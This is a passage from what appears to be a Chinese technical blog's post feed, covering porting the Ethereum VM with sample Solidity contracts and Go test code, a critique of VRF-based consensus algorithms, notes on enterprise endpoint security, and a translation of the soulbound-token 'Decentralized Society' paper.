class="line">	err = json.NewDecoder(file).Decode(&amp;accStat)</span><br><span class="line">	<span class="keyword">return</span> &amp;accStat, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>接下来尝试部署两份智能合约进行测试:</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line">interface BaseInterface &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CurrentVersion</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">string</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helloworld &#123;</span><br><span class="line">    uint256 balance;</span><br><span class="line">    event Triggle(address, string);</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span>=&gt;</span>uint256) _mapamount; </span><br><span class="line">    </span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">        balance = <span class="number">6000000000</span>;</span><br><span class="line">        _mapamount[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line">        _mapamount[<span class="number">1</span>] = <span class="number">200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getbalance</span>(<span class="params"></span>) <span class="title">public</span>  <span class="title">returns</span> (<span class="params">address, uint256</span>) </span>&#123;</span><br><span class="line">        emit Triggle(msg.sender, <span class="string">&quot;funck&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (msg.sender, balance--);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onlytest</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        _mapamount[<span class="number">1</span>] = <span class="number">100</span>;</span><br><span class="line">        emit Triggle(msg.sender, <span class="string">&quot;onlytest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setBalance</span>(<span class="params">uint256 tmp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balance = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVersion</span>(<span class="params">address contractAddr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">string</span>) </span>&#123;</span><br><span class="line">        BaseInterface baseClass = BaseInterface(contractAddr);</span><br><span class="line">       <span class="keyword">return</span> baseClass.CurrentVersion();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract BaseContract &#123;</span><br><span class="line">  address public owner;</span><br><span class="line"> <span class="comment">// </span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">CurrentVersion</span>(<span class="params"></span>) <span class="title">pure</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">string</span>)  </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;BaseContractV0.1&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这两个合约我们就可以测试到一些view 类型的函数调用， 一些对数据状态有修改的合约调用， 和跨合约的调用。 我们可以将上面的两个合约通过ethereum官方出品的remix进行编译，得到字节码。因为BaseContract没有涉及初始化的内容 所以我们可以直接使用runtime的bytecode。 不过我们直接使用Create函数去部署合约。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">runtimeBytecode, contractAddr, leftgas, <span class="attr">err</span> := vmenv.Create(vm.AccountRef(normalAccount), helloCode, <span class="number">10000000000</span>, big.NewInt(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>第一个返回值其实就是需要部署的runtime字节码 ， 我们调用<code>stateDb.SetCode(helloWorldcontactAccont, runtimeBytecode)</code>将其部署。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> normalAddress, _ = hex.DecodeString(<span class="string">&quot;123456abc&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> hellWorldcontractAddress, _ = hex.DecodeString(<span class="string">&quot;987654321&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> baseContractAddress, _ = hex.DecodeString(<span class="string">&quot;038f160ad632409bfb18582241d9fd88c1a072ba&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> normalAccount = common.BytesToAddress(normalAddress)</span><br><span class="line"><span class="keyword">var</span> helloWorldcontactAccont = common.BytesToAddress(hellWorldcontractAddress)</span><br><span class="line"><span class="keyword">var</span> baseContractAccont = common.BytesToAddress(baseContractAddress)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本账户字节码</span></span><br><span class="line"><span class="keyword">var</span> baseCodeStr = <span class="string">&quot;608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632b225f29146100675780638afc3605146100f75780638da5cb5b1461010e578063f2fde38b14610165575b600080fd5b34801561007357600080fd5b5061007c6101a8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100bc5780820151818401526020810190506100a1565b50505050905090810190601f1680156100e95780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561010357600080fd5b5061010c6101e5565b005b34801561011a57600080fd5b50610123610227565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561017157600080fd5b506101a6600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061024c565b005b60606040805190810160405280601081526020017f42617365436f6e747261637456302e3100000000000000000000000000000000815250905090565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102a757600080fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141515156102e357600080fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3505600a165627a7a723058208c3064096245894122f6bcf5e2ee12e30d4775a3b8dca0b21f10d5a5bc386e8b0029&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// hellworld 账户字节码</span></span><br><span class="line"><span class="keyword">var</span> hellCodeStr = <span class="string">&quot;6080604052600436106100615763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416634d9b3d5d81146100665780637e8800a7146100ab578063c3f82bc3146100c2578063fb1669ca14610165575b600080fd5b34801561007257600080fd5b5061007b61017d565b6040805173ffffffffffffffffffffffffffffffffffffffff909316835260208301919091528051918290030190f35b3480156100b757600080fd5b506100c06101fa565b005b3480156100ce57600080fd5b506100f073ffffffffffffffffffffffffffffffffffffffff6004351661028f565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561012a578181015183820152602001610112565b50505050905090810190601f1680156101575780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561017157600080fd5b506100c0600435610389565b60408051338152602081018290526005818301527f66756e636b0000000000000000000000000000000000000000000000000000006060820152905160009182917f08c31d20d5c3a5f2cfe0adf83909e6411f43fe97eb091e15c12f3e5a203e8fde9181900360800190a150506000805460001981019091553391565b600080526001602090815260647fa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4955604080513381529182018190526008828201527f6f6e6c79746573740000000000000000000000000000000000000000000000006060830152517f08c31d20d5c3a5f2cfe0adf83909e6411f43fe97eb091e15c12f3e5a203e8fde9181900360800190a1565b606060008290508073ffffffffffffffffffffffffffffffffffffffff16632b225f296040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102fa57600080fd5b505af115801561030e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101561033757600080fd5b81019080805164010000000081111561034f57600080fd5b8201602081018481111561036257600080fd5b815164010000000081118282018710171561037c57600080fd5b5090979650505050505050565b6000555600a165627a7a72305820c63a859d93a3512b52ccaec75bb9aa146648c41b21c8a0cd0cd2e2c1aede35ed0029&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> helloCode, _ = hex.DecodeString(hellCodeStr)</span><br><span class="line"><span class="keyword">var</span> baseCode, _ = hex.DecodeString(baseCodeStr)</span><br><span class="line"></span><br><span class="line">func <span class="function"><span class="title">updateContract</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">	<span class="comment">// 加载账户State</span></span><br><span class="line">	stateDb, <span class="attr">err</span> := cvm.TryLoadFromDisk()</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	stateDb.SetCode(helloWorldcontactAccont, helloCode)</span><br><span class="line">	stateDb.SetCode(baseContractAccont, baseCode)</span><br><span class="line">	fmt.Println(stateDb.Commit())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们调用一个智能合约比如getbalance函数， 代码类似下面这样:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4d9b3d5d : getbalance  7e8800a7: onlytest fb1669ca000000000000000000000000000000000000000000000000000000000000029a: setbalance 666</span></span><br><span class="line"><span class="keyword">var</span> input, _ = hex.DecodeString(<span class="string">&quot;7e8800a7&quot;</span>)</span><br><span class="line"></span><br><span class="line">func <span class="function"><span class="title">main</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">	<span class="comment">// updateContract()</span></span><br><span class="line">	<span class="comment">// return</span></span><br><span class="line">	<span class="comment">// 创建账户State</span></span><br><span class="line">	stateDb, <span class="attr">err</span> := cvm.TryLoadFromDisk()</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	evmCtx := cvm.NewEVMContext(normalAccount, <span class="number">100</span>, <span class="number">1200000</span>, <span class="number">1</span>)</span><br><span class="line">	vmenv := vm.NewEVM(evmCtx, stateDb, vm.Config&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	ret, leftgas, <span class="attr">err</span> := vmenv.Call(vm.AccountRef(normalAccount), helloWorldcontactAccont, input, <span class="number">1000000</span>, big.NewInt(<span class="number">0</span>))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;ret: %v, usedGas: %v, err: %v, len(ret): %v, hexret: %v, &quot;</span>, ret, <span class="number">1000000</span>-leftgas, err, len(ret), hex.EncodeToString(ret))</span><br><span class="line"></span><br><span class="line">	abiObjet, <span class="attr">_</span> := abi.JSON(strings.NewReader(hellWorldContractABIJson))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// begin, length, _ := lengthPrefixPointsTo(0, ret)</span></span><br><span class="line">	addr := <span class="keyword">new</span>(common.Address)</span><br><span class="line"></span><br><span class="line">	value := big.NewInt(<span class="number">0</span>) <span class="comment">//new(*big.Int)</span></span><br><span class="line">	restult := []interface&#123;&#125;&#123;addr, &amp;value&#125;</span><br><span class="line">	fmt.Println(abiObjet.Unpack(&amp;restult, <span class="string">&quot;getbalance&quot;</span>, ret))</span><br><span class="line">	<span class="comment">//fmt.Println(unpackAtomic(&amp;restult, string(ret[begin:begin+length])))</span></span><br><span class="line">	println(restult[<span class="number">0</span>].(*common.Address).String(), (*restult[<span class="number">1</span>].(**big.Int)).String())</span><br><span class="line">	fmt.Println(stateDb.Commit())</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>到了这里， evm移植流程就算完成了。 如果理解evm执行的原理， 大部分的工作其实就是拷贝， 出错的任务。 当然这个移植后的代码肯定是不能在生产中使用的， 但是需要修改和添加的代码主要也就是上文提到的内容。 最后还是想说明白原理和流程就是成功了一大半， 后面的部分主要就是调试和排错的过程了。</p>
]]></content>
      <tags>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>简评三个基于VRF的共识算法</title>
    <url>/2018/07/14/%E7%AE%80%E8%AF%84%E4%B8%89%E4%B8%AA%E5%9F%BA%E4%BA%8EVRF%E7%9A%84%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/2b9fa8633df1">https://www.jianshu.com/p/2b9fa8633df1</a></p>
<p>Algorand、Dfinity和Ouroboros Praos三个共识算法（Dfinity虽然是项目名，这里用来称呼其共识算法也应无不妥）近期较受关注，而且都是基于VRF(Verifiable Random Function) 设计，可以对照学习。Algorand的版本很多，以下单指 1607.01341v9，暂称其为Algorand’（笔者手中另有Algorand的最新版本，其中已对下文提及的几处问题完成了修正，可与本文参看）。</p>
<h3 id="一、VRF的共性"><a href="#一、VRF的共性" class="headerlink" title="一、VRF的共性"></a>一、VRF的共性</h3><p>VRF的意义很好理解——用以完成出块人（群）的随机选择。为此，VRF的返回值应尽力难以预测。先看Algorand’和Dfinity的套路是怎么做的：大体上是先将前一个随机数（最初的随机数却是协议给定的）和某种代表高度、轮次的变量进行组合，用某种私钥对之进行签名（或者是先签名再组合），最后哈希一下得出最新的随机数。这样产生的随机数旁人很容易验证其合乎算法，”V”就这样得到了；而哈希返回值又是随机分布的，“R”也因此得到保证。在此过程中，为降低操纵结果的可能性，有两个注意事项：A) 签名算法应当具有唯一性，也就是用同一把私钥对同样的信息进行签名，只有一个合法签名可以通过验证——普通的非对称加解密算法一般不具备这个属性，如SM2。如果用的签名算法没有这种uniqueness属性，那在生成新随机数的时候就存在通过反复多次尝试签名以挑出最有利者的余地，会降低安全性。B) 避免在生成新随机数时将当前块的数据作为随机性来源之一，比如引用本块交易列表的merkle root值等等，因为这样做会给出块人尝试变更打包交易顺序、尝试打包不同交易以产生最有利的新随机数的余地。在设计和检视新的共识算法时，以上两个注意事项是要特别留意的。</p>
<p>考察一下VRF的返回结果应该如何运用。目前所见用法中，VRF的返回结果可以用来公开完成节点或节点群体的选择，也可以私密地完成选择。以Dfinity为例，它是利用mod操作来唯一、公开地确定一个Group。Algorand、Ouroboros Praos是私密选择的范例，大致套路是对VRF的最新返回值，配上轮次等变量后用私钥进行签名并哈希，如果哈希值小于某个阈值，节点就可以私密地知道自己被选中。这种方法很可能在网络节点数较多时的表现会更稳定，否则幸运儿个数上下波动会较大，进而影响协议表现，包括空块和分叉。</p>
<h3 id="二、简评强同步假设版本的Algorand"><a href="#二、简评强同步假设版本的Algorand" class="headerlink" title="二、简评强同步假设版本的Algorand"></a>二、简评强同步假设版本的Algorand</h3><p>私密选择提供了较强的抗击定点攻击的能力，但由于幸运儿的总数对于任何一个幸运儿都是不能预知的，也因此给后续共识算法的设计和区块链的优化带来了困难。Algorand‘采用了很强的同步网络假设（同步网络假设下的共识算法当然容易做一些），要求预先知道网络消息传播时间的上限：在固定时间内完成对固定比例的用户的网络传播。比如要知道，1KB消息，在1秒钟内完成全网95%的传播，而1MB消息需要1.5分钟完成全网95%的传播。但这个传输上限应该如何选择？ 通过一段时间的统计结果再乘以一个系数这种经验统计？只能说“感觉上可以”，但如果要严谨和安全，Algorand‘算法应该补充证明即使在遭遇DDOS或互联网拥堵的情况下消息传播严重超限后算法仍然能够保证安全——然而这个证明是缺失的。作为对照，Ouroboros Praos公开承认之前在同步网络假设下设计的Ouroboros协议在异步网络条件下会出错，所以才又做了Ouroboros Praos；新版本的Algorand承认在弱同步网络时会在不同的块上达成共识（后续网络恢复强同步时分叉可以得到解决）云云，这些都可资参考。</p>
<p>即使我们暂且认可Algorand’算法可以通过设定一个很大的传播时间上限来回应上述问题，但随之而来的是此时可以看出此算法缺乏一个非常好的特性：Responsiveness。这个特性指的是：若一个协议被设计为在一个较大的传播时间上限DELTA下工作，但若实际传播时间是较小的delta，则协议的实际推进步调将只和delta有关，这种协议被称为Responsive的。具有Responsive特性的共识算法再配以同步网络假设会非常理想——出于安全，上限可以设置很大，然而协议执行速度只和当时网络条件有关。Algorand’并不具有这种特性。平均而言，Algorand’完成共识所需的消息传送次数是11轮，每轮如果要确保安全，完成共识的时间就会很长，单个分区的吞吐量就不会太高。当然，架构设计涉及很多取舍，最终评价一个算法好还是不好还是要回到初心——准备拿来实现的目标是什么。上述分析只是尝试客观地指出Algorand’算法的几个少为人知的固有特征，供读者自行评估。</p>
<h3 id="三、简评Dfinity的可扩展性问题"><a href="#三、简评Dfinity的可扩展性问题" class="headerlink" title="三、简评Dfinity的可扩展性问题"></a>三、简评Dfinity的可扩展性问题</h3><p>私密选择并且立即上任的做法，也给系统分片带来了极大挑战。Dfinity是明确要做分片(Sharding)的，所以必须直面挑战。可扩展性问题非常复杂，完整解决这个问题需要通盘考虑网络、存储、计算三方面的可扩展性——时下大多数区块链3.0项目只注意到计算的分片和可扩展性，忽略了其余二者，从而不可能真正实现理想的扩展。由于公链节点网络带宽的制约，计算合约所需的数据通常很难迅速地从一个节点拷贝到另一节点，所以就算用VRF实现了飘忽来去的出块节点选择，存储节点是没法同样飘逸如风的。明显的选择有那么几个：全部节点存储全部数据，不同节点静态地分配用来存储不同分区。前者的可扩展性很差，对于后者而言，如果出块节点漂浮不定且出块节点还需要完成合约运算，就意味着基于P2P网络来回远程访问存储，性能多半急剧下降；动态决定的出块节点只完成排序共识，计算能力和存储捆绑，通过静态分区提供可扩展性，可能是合理的应对。然而，最可恨的就是“然而”二字——即使如此，系统还存在一处对存储和网络构成压力的所在：最终用户提交的待打包交易。普通公链（先不考虑EOS那种）的带宽有限，如果用户提交的待打包交易必须粗放型地全网泛滥传播，那现有网络带宽可以提供多少TPS？如果出块节点是静态分区或者至少提前一段时间公开知晓，事情尚有回旋余地；如果出块节点是如此飘忽不定，而且直到最后一刻也只有这些节点自己知道，那无论是用户还是出块节点候选人看起来最直接的应对之道就是全网泛滥传播全部待打包交易、保存全部待打包交易，这样带宽和存储仍然成为系统瓶颈。</p>
<p>所以这里碰到的，本质上还是安全、可扩展性、去中心化的不可能三角。</p>
<h3 id="四、简评Ouroboros-Praos"><a href="#四、简评Ouroboros-Praos" class="headerlink" title="四、简评Ouroboros Praos"></a>四、简评Ouroboros Praos</h3><p>BM怼 Ouroboros的文字已经流传广泛。BM的话当然有些明显是不对的，比如Ouroboros的DPOS是指”Dynamic [stake distribution] POS”而不是BM的Delegate POS，但其关于Pareto分布的评论则值得玩味。如果我们仔细浏览后出的Ouroboros Praos，可以发现协议的安全假设和安全证明完全没有考虑经济博弈因素，因此洋洋洒洒的证明很可能会不得要领而错过真正需要防护的方向——毕竟一直以来POS/DPOS这些协议的血管里面流淌的就是基于经济博弈和人性进行设计的血液。最明显的例子是在forward secure signature的实现方法上，协议目前的设计是要求每个好的节点自觉主动地安全删除用过的私钥，而完全没有考虑近乎零的私钥保存成本如何面对bribe attack的诱惑，然而这却是值得考虑的。除了形式化证明之外，Ouroboros Praos本身并没有太多值得关注的协议特征，总体上就是用VRF抽签结合POS算法并针对某些安全假设进行了形式化证明，其做事的态度是非常值得赞赏的。</p>
<h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>这几个算法本身颇有创意，也很值得学习。与此同时，在看过以太坊CASPER目前披露的分区技术后，笔者的体会是：区块链3.0的竞争才刚刚开始，从以太坊团队的技术路线看，他们的技术考量和选择要比很多宣称要超越以太坊的团队来得深刻和全面。如果当真要超越以太坊，还是应该先从理解以太坊开始。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法图解</title>
    <url>/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
    <content><![CDATA[<p>这是我见过的最 nice 的算法图解。</p>
<p><a href="https://idea-instructions.com/">https://idea-instructions.com/</a></p>
<p><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/quick-sort.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/public-key.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/merge-sort.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/graph-scan.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/euler-path.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/bogo-sort.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/binary-search.png"><br><img src="/2018/04/12/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/avl-tree.png"></p>
]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>终端安全和网络代理</title>
    <url>/2024/10/21/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E5%92%8C%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="通用架构"><a href="#通用架构" class="headerlink" title="通用架构"></a>通用架构</h2><p>员工 —&gt;<br>Downstream(DRN) — HTTPS—&gt; Int. Firewall —HTTPS —&gt; Upstream (DMZ) —&gt; Ext. Firewall —&gt; Internet</p>
<h2 id="聊天软件"><a href="#聊天软件" class="headerlink" title="聊天软件"></a>聊天软件</h2><p>员工 —&gt;<br>GRE Router(HK, UK, China等国家) —&gt; GRE Tunnel Encapsulation —&gt; <strong>Zscaler</strong> (Cloud) —&gt; MS Cloud (Teams) </p>
<h2 id="网盘"><a href="#网盘" class="headerlink" title="网盘"></a>网盘</h2><p>员工 —&gt;<br>网络策略Policy —&gt; SAML —&gt; Azure IDP </p>
<h2 id="上网浏览"><a href="#上网浏览" class="headerlink" title="上网浏览"></a>上网浏览</h2><p>员工 —&gt;<br>网络策略Policy —&gt; Internet</p>
<h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>远程员工 —&gt;<br>网络策略Policy —&gt; 拆分通道 —&gt; ZOOM</p>
<h2 id="Zscaler的能力"><a href="#Zscaler的能力" class="headerlink" title="Zscaler的能力"></a><a href="https://www.zscaler.com/">Zscaler的能力</a></h2><ul>
<li>1）为用户建立profile，2）制定policy，3）执行policy - 控制用户的网络浏览。</li>
<li>可以和企业内部的 AD 整合。</li>
<li>用户端无法logout，无法退出，无法修改policy，确保用户执行policy。</li>
<li>管理员端可以方便地监控全体用户端流量情况，如，哪些 App 流量最高，用户端device类型/型号。</li>
<li>支持多云环境，自动更新，低延时，<strong>全球部署</strong>。</li>
</ul>
<h2 id="Broadcom"><a href="#Broadcom" class="headerlink" title="Broadcom"></a><a href="https://www.broadcom.com/">Broadcom</a></h2><ul>
<li>服务端网络安全管理</li>
</ul>
<h2 id="Trellix-Endpoint-Security"><a href="#Trellix-Endpoint-Security" class="headerlink" title="Trellix Endpoint Security"></a><a href="https://www.trellix.com/products/endpoint-security/">Trellix Endpoint Security</a></h2><ul>
<li>确保所有安全组件无缝运行，为所有载体提供强大的保护。</li>
<li>可以在用户工作电脑端，云端部署。</li>
<li>中心化管理。</li>
</ul>
]]></content>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>翻译1-Decentralized Society Finding Web3 Soul</title>
    <url>/2022/05/13/%E7%BF%BB%E8%AF%911-Decentralized%20Society%20Finding%20Web3%20Soul/</url>
    <content><![CDATA[<h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><blockquote>
<p>Web3 today centers around expressing transferable, financialized assets, rather than encoding social<br>relationships of trust. Yet many core economic activities—such as uncollateralized lending and building personal brands—are built on persistent, non-transferable relationships. In this paper, we illustrate how non-transferable “soulbound” tokens (SBTs) representing the commitments, credentials, and affiliations of “Souls” can encode the trust networks of the real economy to establish provenance and reputation. More importantly, SBTs enable other applications of increasing ambition, such as community wallet recovery, sybil-resistant governance, mechanisms for decentralization, and novel markets with decomposable, shared rights. We call this richer, pluralistic ecosystem “Decentralized Society” (DeSoc)—a co-determined sociality, where Souls and communities come together bottom-up, as emergent properties of each other to co-create plural network goods and intelligences, at a range of scales. Key to this sociality is decomposable property rights and enhanced governance mechanisms—such as quadratic funding discounted by correlation scores—that reward trust and cooperation while protecting networks from capture, extraction, and domination. With such augmented sociality, web3 can eschew today’s hyper-financialization in favor of a more transformative, pluralist future of increasing returns across social distance.</p>
</blockquote>
<p>今天的 Web3 以表达可转让的金融化资产为中心，而不是编码信任的社会关系。然而，许多核心经济活动——例如无抵押贷款和建立个人品牌——都是建立在持久的、不可转让的关系之上的。在本文中，我们说明了代表“灵魂”的承诺、凭证和从属关系的不可转让“灵魂绑定”令牌 (SBT) 如何编码实体经济的信任网络以建立出处和声誉。更重要的是，SBT 支持其他雄心勃勃的应用，例如社区钱包恢复、抗女巫治理、去中心化机制以及具有可分解、共享权利的新市场。我们将这个更丰富、多元化的生态系统称为“去中心化社会”（DeSoc）——一种共同决定的社会性，灵魂和社区自下而上地聚集在一起，作为彼此的新兴属性，在一定范围内共同创造多元化的网络商品和智能的规模。这种社会性的关键是可分解的产权和增强的治理机制——例如相关分数打折的二次融资——奖励信任和合作，同时保护网络不被捕获、提取和支配。借助这种增强的社交性，web3 可以避开当今的超金融化，转而支持更具变革性、多元化的未来，即跨社会距离增加回报。</p>
<blockquote>
<h3 id="§1-INTRODUCTION"><a href="#§1-INTRODUCTION" class="headerlink" title="§1 INTRODUCTION"></a>§1 INTRODUCTION</h3><p>Web3 has stunned the world by forging a parallel system of finance of unprecedented flexibility and<br>creativity in less than a decade. Cryptographic and economic primitives such as public key cryptography, smart contracts, proof of work, and proof of stake have led to a sophisticated and open ecosystem for expressing financial transactions.</p>
<p>Yet the economic value finance trades on is generated by humans and their relationships. Because<br>web3 lacks primitives to represent such social identity, it has become fundamentally dependent on the very centralized web2 structures it aims to transcend, replicating their limitations.<br>Examples of these dependencies include:</p>
<ol>
<li><p>Most NFT artists rely on centralized platforms like OpenSea and Twitter to commit to<br> scarcity and initial provenance.</p>
</li>
<li><p>DAOs that try to move beyond simple coin-voting often rely on web2 infrastructure, such<br> as social media pro￾les, for sybil resistance.</p>
</li>
<li><p>Many web3 participants rely on custodial wallets managed by centralized entities like<br> Coinbase or Binance. Decentralized key management systems are not user-friendly for any<br> but the most sophisticated.</p>
</li>
</ol>
<p>Furthermore, the lack a native web3 identity makes today’s DeFi ecosystem unable to support  activities ubiquitous in the real economy, such as undercollateralized lending or simple contracts, like an  apartment lease. In this paper, we illustrate how even small and incremental steps towards representing  social identity with soulbound tokens could overcome these limitations and bring the ecosystem far closer to  regenerating markets with their underpinning human relationships in a native web3 context.</p>
<p>Even more promising, we highlight how native web3 social identity, with rich social composability, could yield great progress on broader long-standing problems in web3 around wealth concentration and vulnerability of governance to financial attacks, while spurring a Cambrian explosion of innovative political, economic, and social applications. We refer to these use cases and the richer pluralistic ecosystem that they enable as “Decentralized Society” (DeSoc).</p>
</blockquote>
<p>Web3 在不到十年的时间里打造了一个具有前所未有的灵活性和创造力的平行金融系统，震惊了世界。密码学和经济原语，例如公钥密码学、智能合约、工作量证明和权益证明，已经形成了一个用于表达金融交易的复杂而开放的生态系统。<br>然而，金融交易的经济价值是由人类及其关系产生的。因为 web3 缺乏代表这种社会身份的原语，它已经从根本上依赖于它旨在超越的非常集中的 web2 结构，复制它们的局限性。<br>这些依赖项的示例包括：</p>
<ol>
<li><p>大多数 NFT 艺术家依靠 OpenSea 和 Twitter 等中心化平台来承诺稀缺性和初始出处。</p>
</li>
<li><p>试图超越简单的硬币投票的 DAO 通常依赖于 web2 基础设施，例如社交媒体配置文件，以抵抗女巫。</p>
</li>
<li><p>许多 web3 参与者依赖于由 Coinbase 或 Binance 等中心化实体管理的托管钱包。去中心化的密钥管理系统除了最复杂的人外，对任何人都不友好。</p>
</li>
</ol>
<p>此外，缺乏原生的 web3 身份使得今天的 DeFi 生态系统无法支持实体经济中无处不在的活动，例如抵押不足的贷款或简单的合同，例如公寓租赁。在本文中，我们说明了即使是用灵魂绑定的代币表示社会身份的微小和渐进的步骤也可以克服这些限制，并使生态系统更接近于在原生 web3 环境中以人际关系为基础的再生市场。</p>
<p>更有希望的是，我们强调了具有丰富社会可组合性的原生 web3 社会身份如何在 web3 中围绕财富集中和治理易受金融攻击的更广泛长期存在的问题上取得巨大进展，同时刺激寒武纪的创新政治、经济爆炸和社交应用。我们将这些用例和它们所支持的更丰富的多元化生态系统称为“去中心化社会”（DeSoc）。</p>
<blockquote>
<h3 id="§2-OUTLINE"><a href="#§2-OUTLINE" class="headerlink" title="§2 OUTLINE"></a>§2 OUTLINE</h3><p>We begin by explaining the primitives of DeSoc, centered around accounts (or wallets) holding non-transferable (initially public) “soulbound” tokens (SBTs) representing commitments, credentials, and affiliations. Such tokens would be like an extended resume, issued by other wallets that attest to these social relations.</p>
<p>We then describe a “stairway” of increasingly ambitious applications across the social stack such primitives could empower, including:</p>
<ul>
<li><p>establishing provenance</p>
</li>
<li><p>unlocking undercollateralized lending markets through reputation</p>
</li>
<li><p>enabling decentralized key management</p>
</li>
